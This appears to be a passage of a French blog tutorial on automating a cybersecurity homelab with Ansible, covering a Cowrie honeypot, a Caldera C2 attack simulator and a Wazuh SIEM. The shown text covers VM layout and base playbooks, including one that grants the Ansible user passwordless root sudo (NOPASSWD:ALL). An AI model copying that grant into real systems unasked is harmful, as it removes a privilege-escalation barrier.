+    <li><a href="#5-vm-wazuh--déploiement-du-siem">5. VM Wazuh – Déploiement du SIEM</a>
+      <ul>
+        <li><a href="#51-installation">5.1. Installation</a></li>
+        <li><a href="#52-installation-de-lagent-wazuh-sur-la-vm-cowrie">5.2 Installation de l&rsquo;Agent Wazuh sur la VM Cowrie</a></li>
+        <li><a href="#53-configuration-du-monitoring-des-logs-cowrie">5.3 Configuration du monitoring des logs Cowrie</a></li>
+        <li><a href="#54-définition-des-règles-dalerte-personnalisées">5.4. Définition des Règles d’Alerte Personnalisées</a></li>
+        <li><a href="#55-test-de-la-configuration-et-simulation-dattaques">5.5. Test de la Configuration et Simulation d’Attaques</a></li>
+        <li><a href="#56-analyse-des-logs">5.6 Analyse des logs</a></li>
+        <li><a href="#57-analyse-approfondie-et-visualisation">5.7. Analyse Approfondie et Visualisation</a>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#6-dashboard">6. Dashboard</a></li>
+    <li><a href="#conclusion"><strong>Conclusion:</strong></a></li>
+    <li><a href="#références">Références:</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction"><strong>Introduction</strong></a></li>
+    <li><a href="#1-configuration-et-déploiement-de-lenvironnement">1. Configuration et déploiement de l&rsquo;environnement</a></li>
+    <li><a href="#2-mise-à-jour-et-installation-des-outils-de-base">2. Mise à jour et installation des outils de base</a>
+      <ul>
+        <li><a href="#21-installation-de-base-pour-toutes-les-vms">2.1. Installation de base (pour toutes les VMs)</a></li>
+        <li><a href="#22-configuration-de-lenvironnement-ansible">2.2 Configuration de l&rsquo;Environnement Ansible</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-installation-et-configuration-des-services">3. Installation et configuration des services</a>
+      <ul>
+        <li><a href="#31-vm-cowrie-honeypot">3.1. VM Cowrie (Honeypot)</a></li>
+        <li><a href="#32-déploiement-manuel">3.2. Déploiement manuel</a>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+        <li><a href="#33-automatisation-du-déploiement-avec-ansible">3.3. Automatisation du déploiement avec Ansible</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-vm-caldera--déploiement-du-serveur-c2">4. VM Caldera – Déploiement du Serveur C2</a>
+      <ul>
+        <li><a href="#41-installation-de-caldera">4.1. Installation de Caldera</a></li>
+        <li><a href="#42-compilation-du-front-end-et-accès-à-linterface-web">4.2. Compilation du Front-end et Accès à l&rsquo;interface web</a></li>
+        <li><a href="#43-intégration-de-plugins">4.3. Intégration de plugins</a></li>
+        <li><a href="#44-déploiement-de-lagent-caldera-sur-la-vm-cowrie">4.4. Déploiement de l&rsquo;agent Caldera sur la VM Cowrie</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-vm-wazuh--déploiement-du-siem">5. VM Wazuh – Déploiement du SIEM</a>
+      <ul>
+        <li><a href="#51-installation">5.1. Installation</a></li>
+        <li><a href="#52-installation-de-lagent-wazuh-sur-la-vm-cowrie">5.2 Installation de l&rsquo;Agent Wazuh sur la VM Cowrie</a></li>
+        <li><a href="#53-configuration-du-monitoring-des-logs-cowrie">5.3 Configuration du monitoring des logs Cowrie</a></li>
+        <li><a href="#54-définition-des-règles-dalerte-personnalisées">5.4. Définition des Règles d’Alerte Personnalisées</a></li>
+        <li><a href="#55-test-de-la-configuration-et-simulation-dattaques">5.5. Test de la Configuration et Simulation d’Attaques</a></li>
+        <li><a href="#56-analyse-des-logs">5.6 Analyse des logs</a></li>
+        <li><a href="#57-analyse-approfondie-et-visualisation">5.7. Analyse Approfondie et Visualisation</a>
+          <ul>
+            <li></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#6-dashboard">6. Dashboard</a></li>
+    <li><a href="#conclusion"><strong>Conclusion:</strong></a></li>
+    <li><a href="#références">Références:</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" >
+    
+    <summary
+        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+        Homelabs - This article is part of a series.
+    </summary>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        Part : This Article
+    </div>
+    
+    
+
+
+</details>
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h2 class="relative group"><strong>Introduction</strong> 
+    <div id="introduction" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Dans un contexte où la cybersécurité devient chaque jour plus critique, il est primordial de disposer d&rsquo;un environnement de test permettant de simuler des attaques et d&rsquo;analyser les comportements des attaquants en temps réel. Ce projet vise à automatiser la mise en place d&rsquo;un lab de cybersécurité à l&rsquo;aide d&rsquo;Ansible, en orchestrant le déploiement et la configuration de plusieurs machines virtuelles (VMs). Grâce à l&rsquo;intégration de solutions telles que Caldera pour simuler des attaques C2, Cowrie pour agir comme honeypot, et Wazuh pour centraliser et analyser les logs, l&rsquo;objectif est de créer un écosystème complet permettant d&rsquo;étudier les tactiques, techniques et procédures (TTPs) des attaquants et de valider la résilience d&rsquo;une infrastructure.</p>
+<hr>
+
+
+<h2 class="relative group">1. Configuration et déploiement de l&rsquo;environnement 
+    <div id="1-configuration-et-d%C3%A9ploiement-de-lenvironnement" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#1-configuration-et-d%C3%A9ploiement-de-lenvironnement" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Pour ce projet, nous allons configurer un environnement de test avec <strong>4 machines virtuelles (VMs)</strong> sous VMware, chacune ayant une mission définie. Commençons par la première :</p>
+<ul>
+<li>
+<p><strong>VM Cowrie (Honeypot)</strong><br>
+Installée sous Ubuntu 22.04 et assignée à une IP statique (<code>192.168.243.130</code>), cette machine simulera un serveur vulnérable exposé sur SSH/Telnet via l’outil Cowrie. Son rôle est double : Attirer les attaquants en imitant des services sensibles et capturer leurs actions (commandes, téléchargements, etc.) tout en transférant ces logs vers notre SIEM pour analyse.</p>
+</li>
+<li>
+<p><strong>VM Caldera (Serveur C2)</strong><br>
+Hébergée sur Ubuntu 22.04 (IP : <code>192.168.243.131</code>), cette machine exécutera la plateforme Caldera pour orchestrer des attaques réalistes. Grâce à son agent Sandcat, déployé sur les cibles, elle permettra de tester nos défenses en reproduisant des techniques MITRE ATT&amp;CK, telles que l’exfiltration de données ou les mouvements latéraux.</p>
+</li>
+<li>
+<p><strong>VM Wazuh (SIEM)</strong><br>
+Sur Ubuntu 22.04 (IP : <code>192.168.243.132</code>), cette machine centralisera les logs des autres machines via Wazuh Manager. Pour renforcer son utilité, nous y intégrerons Elasticsearch et Kibana afin de visualiser les données en temps réel. Un point crucial sera la création de règles personnalisées pour détecter les TTPs référencés par MITRE, permettant d’identifier rapidement les comportements suspects.</p>
+</li>
+<li>
+<p><strong>VM Ansible (Automatisation)</strong><br>
+Sur Ubuntu 22.04 (IP : <code>192.168.243.129</code>), contiendra les playbooks Ansible pour déployer et configurer les autres VMs sans intervention manuelle. Par exemple, un playbook pourra installer Cowrie avec ses dépendances, un autre configurera Wazuh avec ses connecteurs, et un troisième déploiera Caldera avec ses profils d’attaques prédéfinis. Cette centralisation réduit les erreurs et accélère les mises à jour.</p>
+</li>
+</ul>
+<p>La VM Cowrie tournera sous 2 Go de RAM et 20 Go de stockage, la VM Caldera sous 2 Go de RAM et 20 Go de stockage, la VM Wazuh sous 4 Go de RAM et 40 Go de stockage, et la VM Ansible sous 1 Go de RAM et 20 Go de stockage. Toutes les machines utiliseront Ubuntu 22.04.</p>
+<p>L’idée est de créer un écosystème cohérent dans lequel les interactions entre le honeypot, le simulateur d’attaques (Caldera) et le SIEM (Wazuh) permettent de valider la résilience globale de l&rsquo;infrastructure. L&rsquo;automatisation via Ansible ajoute une couche de reproductibilité essentielle pour des tests itératifs et garantit la cohérence des configurations.</p>
+
+
+<h2 class="relative group">2. Mise à jour et installation des outils de base 
+    <div id="2-mise-%C3%A0-jour-et-installation-des-outils-de-base" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#2-mise-%C3%A0-jour-et-installation-des-outils-de-base" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">2.1. Installation de base (pour toutes les VMs) 
+    <div id="21-installation-de-base-pour-toutes-les-vms" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#21-installation-de-base-pour-toutes-les-vms" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Pour cette opération on se servira de notre vm-ansible pour deployer les configurations sur les trois autres machines</p>
+<ul>
+<li><strong>Installation d&rsquo;Ansible (Control Node)</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt install -y ansible git
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_01_hue361e80a0ee2e58ee7fe0d6aec0970d2_91060_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_01_hue361e80a0ee2e58ee7fe0d6aec0970d2_91060_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_01_hue361e80a0ee2e58ee7fe0d6aec0970d2_91060_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_01_hue361e80a0ee2e58ee7fe0d6aec0970d2_91060_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_01_hue361e80a0ee2e58ee7fe0d6aec0970d2_91060_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<ul>
+<li>Vérification :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ansible --version
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_001_hu3d52b442c831b0513a942fcc6e85c3fa_30217_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_001_hu3d52b442c831b0513a942fcc6e85c3fa_30217_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_001_hu3d52b442c831b0513a942fcc6e85c3fa_30217_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_001_hu3d52b442c831b0513a942fcc6e85c3fa_30217_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_001_hu3d52b442c831b0513a942fcc6e85c3fa_30217_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">2.2 Configuration de l&rsquo;Environnement Ansible 
+    <div id="22-configuration-de-lenvironnement-ansible" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#22-configuration-de-lenvironnement-ansible" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Création de la structure de nos dossiers :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p ~/ansible-cowrie/<span class="o">{</span>inventory,playbooks<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~/ansible-cowrie
+</span></span></code></pre></div><ul>
+<li>Création du fichier d&rsquo;inventaire (<code>inventory.ini</code>) :</li>
+</ul>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_11_hu00a8b164d4862aa27cbdb5ee778a144f_102804_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_11_hu00a8b164d4862aa27cbdb5ee778a144f_102804_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_11_hu00a8b164d4862aa27cbdb5ee778a144f_102804_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_11_hu00a8b164d4862aa27cbdb5ee778a144f_102804_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_11_hu00a8b164d4862aa27cbdb5ee778a144f_102804_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nn">---</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Configuration de base des machines Ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hosts</span><span class="p">:</span><span class="w"> </span><span class="l">all</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">become</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">tasks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Mise à jour des paquets</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">apt</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">update_cache</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">upgrade</span><span class="p">:</span><span class="w"> </span><span class="l">dist</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Installer les outils de base</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">apt</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">openssh-server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">git</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">curl</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">ufw</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">wget</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">htop</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">net-tools</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">software-properties-common</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">python3</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">python3-pip</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">python3-venv</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">bash-completion</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">present</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Activer et démarrer le service SSH</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">systemd</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">ssh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">started</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Configurer le pare-feu UFW</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">ufw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">enabled</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">policy</span><span class="p">:</span><span class="w"> </span><span class="l">deny</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">direction</span><span class="p">:</span><span class="w"> </span><span class="l">incoming</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Autoriser SSH dans le pare-feu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">ufw</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">rule</span><span class="p">:</span><span class="w"> </span><span class="l">allow</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">22</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">proto</span><span class="p">:</span><span class="w"> </span><span class="l">tcp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Nettoyage du système</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">apt</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">autoremove</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">autoclean</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_11_1_hu00a8b164d4862aa27cbdb5ee778a144f_102804_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_11_1_hu00a8b164d4862aa27cbdb5ee778a144f_102804_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_11_1_hu00a8b164d4862aa27cbdb5ee778a144f_102804_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_11_1_hu00a8b164d4862aa27cbdb5ee778a144f_102804_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_11_1_hu00a8b164d4862aa27cbdb5ee778a144f_102804_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Il nous faut ensuite configurer <strong>le sudo sans mot de passe (NOPASSWD)</strong> via un <strong>playbook Ansible</strong>, pour que nos machines distants puissent exécuter des commandes avec sudo sans devoir entrer leur mot de passe à chaque fois.</p>
+<p>Voici à quoi ressemblera notre playbook:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nn">---</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Activer sudo sans mot de passe (NOPASSWD)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hosts</span><span class="p">:</span><span class="w"> </span><span class="l">all</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">become</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">tasks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Créer un fichier sudoers pour autoriser NOPASSWD</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">copy</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">dest</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;/etc/sudoers.d/{{ ansible_user }}_nopasswd&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">content</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ ansible_user }} ALL=(ALL) NOPASSWD:ALL&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">owner</span><span class="p">:</span><span class="w"> </span><span class="l">root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="l">root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0440&#39;</span><span class="w">
+</span></span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_18_hu3c0f7d46a2d3960e6aca3503b705ce05_48797_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_18_hu3c0f7d46a2d3960e6aca3503b705ce05_48797_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_18_hu3c0f7d46a2d3960e6aca3503b705ce05_48797_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_18_hu3c0f7d46a2d3960e6aca3503b705ce05_48797_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_18_hu3c0f7d46a2d3960e6aca3503b705ce05_48797_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>Ce playbook utilise la variable <code>ansible_user</code> pour adapter la ligne à chaque machine.</p>
+</blockquote>
+<p>Étant donné que l&rsquo;option NOPASSWD n&rsquo;est pas encore activé, il faudra lancer notre playbook avec l&rsquo;option<code>--ask-become-pass</code> puis ensuite on pourra éxécuter tous les futurs playbooks sans cette option.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-BASH" data-lang="BASH"><span class="line"><span class="cl">ansible-playbook -i inventory/hosts.ini playbooks/sudo_nopasswd.yml --ask-become-pass
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_19_huc5378c6b63667239a6797358405a6604_72153_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_19_huc5378c6b63667239a6797358405a6604_72153_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_19_huc5378c6b63667239a6797358405a6604_72153_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_19_huc5378c6b63667239a6797358405a6604_72153_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_19_huc5378c6b63667239a6797358405a6604_72153_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>On exécute ensuite nôtre playbook setup.yml pour lancer l&rsquo;opération de configuration de nos différentes machines:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ansible-playbook -i hosts.ini ../playbook/setup.yml
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/ans_21_huc264710d7e824e0e7bee77f277debb97_137864_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/ans_21_huc264710d7e824e0e7bee77f277debb97_137864_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/ans_21_huc264710d7e824e0e7bee77f277debb97_137864_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/ans_21_huc264710d7e824e0e7bee77f277debb97_137864_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/ans_21_huc264710d7e824e0e7bee77f277debb97_137864_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Le playbook s’est bien déroulé comme on peut le voir, sans aucune erreur, et tout devrait donc être fonctionnel.</p>
+
+
+<h2 class="relative group">3. Installation et configuration des services 
+    <div id="3-installation-et-configuration-des-services" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#3-installation-et-configuration-des-services" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">3.1. VM Cowrie (Honeypot) 
+    <div id="31-vm-cowrie-honeypot" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#31-vm-cowrie-honeypot" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>À ce niveau, nous allons d&rsquo;abord procéder manuellement pour nous familiariser avec l&rsquo;outil, avant d&rsquo;automatiser le déploiement à l&rsquo;aide d&rsquo;un playbook Ansible.</p>
+
+
+<h3 class="relative group">3.2. Déploiement manuel 
+    <div id="32-d%C3%A9ploiement-manuel" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#32-d%C3%A9ploiement-manuel" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+
+
+<h5 class="relative group">a) Installation des dépendances et de Cowrie 
+    <div id="a-installation-des-d%C3%A9pendances-et-de-cowrie" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#a-installation-des-d%C3%A9pendances-et-de-cowrie" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
